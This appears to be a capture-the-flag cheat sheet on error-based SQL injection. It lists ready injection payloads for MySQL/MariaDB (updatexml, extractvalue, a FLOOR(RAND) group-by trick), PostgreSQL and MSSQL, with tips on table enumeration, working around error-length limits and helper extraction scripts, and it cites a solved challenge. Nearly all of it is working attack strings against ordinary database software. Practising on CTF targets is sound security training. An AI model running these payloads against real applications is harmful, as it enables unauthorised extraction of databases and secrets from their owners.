# Error-based SQLi (DB error text shown)

**Signs**: `'` produces a database error message on the page ("Search failed: (1064) You have an
error…"). Hint "the shelves talk when ruffled". Make the DB put your data **into the error**.

## MySQL / MariaDB
```sql
' AND updatexml(1,CONCAT(0x7e,(SELECT secret FROM vault LIMIT 1)),1)-- -
' AND extractvalue(1,CONCAT(0x7e,(SELECT secret FROM vault LIMIT 1)))-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT secret FROM vault LIMIT 1),FLOOR(RAND(0)*2))x
      FROM information_schema.tables GROUP BY x)a)-- -
```
In a `LIKE '%<q>%'` search: `%' AND updatexml(1,CONCAT(0x7e,(SELECT secret FROM vault LIMIT 1)),1)-- `
`updatexml`/`extractvalue` show only **~31 chars** → page with `SUBSTRING(x,1,30)`, `SUBSTRING(x,31,30)`.
Enumerate first: `(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())`.

## PostgreSQL
`' AND 1=CAST((SELECT secret FROM vault LIMIT 1) AS int)--` → "invalid input syntax for integer: flag{…}"

## MSSQL
`' AND 1=CONVERT(int,(SELECT TOP 1 secret FROM vault))--`

## SQLite
No rich error functions → use [UNION](union-based.md) or [boolean](boolean-blind.md).

**Unescape** the page before grepping (`&lt;`, `&#39;`): `python scripts/lib/flaggrep.py <url>` does it.
Script: `python scripts/sqli/error_extract.py "$T/search?q={}" --prefix "%' AND " --query "SELECT secret FROM vault LIMIT 1"`

Seen in: `sqli2` (TechBazaar, MariaDB, `updatexml` → flag from `vault.secret`).
